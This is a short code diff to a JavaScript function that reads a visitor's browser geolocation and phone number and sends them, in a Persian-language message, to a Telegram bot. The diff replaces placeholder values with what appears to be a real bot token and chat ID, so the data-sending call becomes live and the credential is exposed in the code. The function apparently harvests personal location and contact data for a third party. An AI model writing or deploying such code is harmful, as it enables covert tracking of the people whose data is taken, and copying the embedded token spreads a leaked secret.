@@ -76,8 +76,8 @@ function sendLocation() {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
             const message = `شماره تلفن: ${phone}, موقعیت: ${latitude}, ${longitude}`;
-            const telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-            const chatId = 'YOUR_CHAT_ID';
+            const telegramToken = '7570828689:AAHWrO48Y9WbjjjG1q5oeKAHZJB44bU2jWE';
+            const chatId = '216273191';
             const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(url)
